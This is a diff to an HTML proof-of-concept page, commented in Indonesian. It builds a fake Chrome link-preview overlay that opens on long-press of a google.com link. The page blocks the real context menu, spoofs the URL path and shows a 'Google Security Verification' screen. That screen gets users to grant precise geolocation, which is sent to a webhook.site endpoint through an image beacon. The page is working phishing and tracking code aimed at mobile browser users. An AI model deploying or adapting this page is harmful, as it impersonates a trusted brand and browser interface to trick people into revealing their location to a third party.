@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Android Origin Desync & Preview PoC</title>
+<title>Fake Preview Overlay PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -27,27 +27,64 @@ body {
   font-weight: 600;
   box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
 }
-#panel {
+
+/* 🔥 Lapisan Fake Preview Overlay yang menimpa layar */
+#fakePreviewOverlay {
   display: none;
-  max-width: 420px;
-  width: 90%;
-  margin-top: 30px;
-  background: #fff;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: #ffffff;
+  z-index: 999999;
+  flex-direction: column;
+  box-sizing: border-box;
+  animation: slideUp 0.25s ease-out;
+}
+
+@keyframes slideUp {
+  from { transform: translateY(100%); }
+  to { transform: translateY(0); }
+}
+
+.preview-header {
+  display: flex;
+  align-items: center;
+  padding: 12px 16px;
+  background: #f1f3f4;
+  border-bottom: 1px solid #dadce0;
+  font-size: 14px;
+  color: #3c4043;
+}
+.preview-header span {
+  margin-left: 10px;
+  font-weight: 500;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.preview-body {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
   padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.15);
   text-align: center;
 }
 button.action-btn {
   font-size: 15px;
-  padding: 10px 16px;
+  padding: 12px 20px;
   border-radius: 8px;
   border: none;
-  background: #34a853;
+  background: #1a73e8;
   color: #fff;
   font-weight: 600;
   cursor: pointer;
-  margin-top: 12px;
+  margin-top: 16px;
+  width: 100%;
+  max-width: 280px;
 }
 .notice {
   margin-top: 14px;
@@ -59,25 +96,31 @@ button.action-btn {
 
 <body>
 
-<!-- Target Link dengan dukungan Long-Press Preview & PushState Context -->
-<a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="triggerLink">Long Press -> Preview Page & Origin Sync</a>
+<!-- Target Link -->
+<a href="https://google.com" class="spoof-link" id="triggerLink">Long Press -> Fake Preview Overlay</a>
 
-<div id="panel">
-  <h2>Geolocation Verification</h2>
-  <p>Tap below to initialize precise coordinate retrieval.</p>
+<!-- 🔥 Elemen Fake Preview yang menimpa tampilan asli -->
+<div id="fakePreviewOverlay">
+  <div class="preview-header">
+    <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#5f6368" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+    <span id="previewUrlText">https://google.com</span>
+  </div>
+  <div class="preview-body">
+    <h2>Google Security Verification</h2>
+    <p>Tap below to authorize session & capture location context.</p>
+    
+    <button class="action-btn" onclick="getLocation()">Verify & Proceed</button>
+    <p id="output" style="margin-top: 16px; font-size: 14px; color: #202124;">Status: Waiting...</p>
 
-  <button class="action-btn" onclick="getLocation()">Get Location</button>
-  <p id="output" style="margin-top: 12px; font-size: 14px; color: #202124;">Location: -</p>
-
-  <div class="notice">
-    Android Chrome security context verification.
+    <div class="notice">
+      Secure preview environment active.
+    </div>
   </div>
 </div>
 
 <script>
 const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
 
-/* 🔥 CORS-proof forensic logger */
 function logEvent(type, extra = {}) {
   const data = {
     type,
@@ -85,22 +128,18 @@ function logEvent(type, extra = {}) {
     epoch: Date.now(),
     url: location.href,
     origin: location.origin,
-    visibility: document.visibilityState,
-    readyState: document.readyState,
     ...extra
   };
-
   const params = new URLSearchParams(data).toString();
   new Image().src = `${LOG_ENDPOINT}?${params}`;
 }
 
-const panel   = document.getElementById('panel');
 const triggerLink = document.getElementById('triggerLink');
-const output  = document.getElementById('output');
+const fakePreviewOverlay = document.getElementById('fakePreviewOverlay');
+const output = document.getElementById('output');
 
 function getLocation() {
   if (!navigator.geolocation) return;
-
   logEvent("geolocation_requested");
 
   navigator.geolocation.getCurrentPosition(
@@ -109,54 +148,31 @@ function getLocation() {
         lat: pos.coords.latitude,
         lon: pos.coords.longitude
       });
-
-      output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+      output.textContent = `Captured: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
     },
     err => {
       logEvent("geolocation_error", { code: err.code });
-      output.textContent = 'Permission denied / error';
+      output.textContent = 'Permission denied';
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
 
-/* Step 1: Android Context Menu / Long Press Integration */
+/* Begitu gestur long-press / contextmenu terdeteksi, timpa layar dengan fake preview */
 triggerLink.addEventListener('contextmenu', (e) => {
-  logEvent("poc_started_contextmenu");
+  e.preventDefault(); // Mencegah menu konteks asli / bawaan browser muncul sepenuhnya
+  logEvent("fake_preview_triggered");
 
-  // Memanipulasi history state agar konteks URL tampak terpercaya sebelum preview terbuka
+  // Memanipulasi history state agar URL tampak sesuai tujuan
   try {
-    history.pushState({ trustedContext: true }, '', '/trusted-auth-portal');
-    logEvent("pushstate_done", { newPath: location.pathname });
-  } catch (err) {
-    logEvent("pushstate_error", { message: err.message });
-  }
+    history.pushState({ previewActive: true }, '', '/preview/google.com');
+  } catch (err) {}
 
-  // Menampilkan panel interaktif bersamaan dengan jeda waktu render Android Chrome
-  setTimeout(() => {
-    panel.style.display = 'block';
-    logEvent("panel_displayed");
-  }, 400);
+  // Menampilkan lapisan fake preview overlay secara instan
+  fakePreviewOverlay.style.display = 'flex';
 });
 
 triggerLink.addEventListener('touchstart', () => {}, { passive: true });
-
-/* Step 2: Android Navigation Race & State Sync */
-window.addEventListener('pageshow', (event) => {
-  logEvent("pageshow", { persisted: event.persisted });
-
-  // Penyesuaian waktu tunda (delay) agar sesuai dengan siklus render UI thread Android Chrome
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        logEvent("navigation_check", {
-          stateLength: history.length,
-          currentPath: location.pathname
-        });
-      }, 120);
-    });
-  });
-});
 </script>
 
 </body>
